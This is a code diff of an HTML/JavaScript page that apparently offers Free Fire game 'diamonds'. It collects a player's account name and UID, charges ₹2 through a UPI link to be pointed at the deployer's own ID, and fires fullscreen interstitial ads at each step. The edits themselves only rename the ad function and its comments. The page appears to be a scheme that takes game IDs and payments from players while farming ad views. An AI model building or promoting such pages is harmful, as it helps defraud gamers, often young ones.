@@ -34,7 +34,7 @@
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
         }
 
-        /* Banner Ad Space Placeholder */
+        /* Top Banner Ad Container (60px height) */
         .top-ad-space {
             width: 100%;
             height: 60px;
@@ -49,6 +49,7 @@
             color: #888;
         }
 
+        /* Large Banner Ad Container (100px height) */
         .large-ad-space {
             width: 100%;
             height: 100px;
@@ -223,6 +224,7 @@
                 <p style="font-size: 12px; color: #aaa;">Click below to pay via UPI App (PhonePe / GPay / Paytm)</p>
             </div>
 
+            <!-- ⚠️ ध्यान दें: 'YOUR_UPI_ID@upi' की जगह अपनी असली UPI ID डालें -->
             <a id="upiPayBtn" href="upi://pay?pa=YOUR_UPI_ID@upi&pn=FreeFireRewards&am=2&cu=INR" class="pay-btn" onclick="finishPayment()">PAY ₹2 VIA UPI APP</a>
             
             <button onclick="goToStep(5)" style="background: transparent; border: 1px solid #888; color: #ccc; margin-top: 10px; font-size: 14px;">Already Paid? Click Here</button>
@@ -240,15 +242,15 @@
     <script>
         let chosenDiamond = null;
 
-        // Android App Interface ट्रिगर करने के फंक्शन
-        function showAndroidAd() {
+        // Android WebView Interface Trigger
+        function triggerAndroidAd() {
             if (window.AndroidInterface && window.AndroidInterface.showInterstitialAd) {
                 window.AndroidInterface.showInterstitialAd();
             }
         }
 
         function handleStep1() {
-            showAndroidAd(); // Fullscreen Ad Trigger
+            triggerAndroidAd();
             goToStep(2);
         }
 
@@ -260,7 +262,7 @@
                 alert("Please enter both Account Name and UID!");
                 return;
             }
-            showAndroidAd(); // Fullscreen Ad Trigger
+            triggerAndroidAd();
             goToStep(3);
         }
 
@@ -268,7 +270,7 @@
             document.querySelectorAll('.diamond-card').forEach(card => card.classList.remove('selected'));
             element.classList.add('selected');
             chosenDiamond = amount;
-            showAndroidAd(); // Fullscreen Ad Trigger on Selection
+            triggerAndroidAd();
         }
 
         function proceedToPayment() {
@@ -276,7 +278,7 @@
                 alert("Please select a diamond amount first!");
                 return;
             }
-            showAndroidAd(); // Fullscreen Ad Trigger
+            triggerAndroidAd();
             goToStep(4);
         }
 
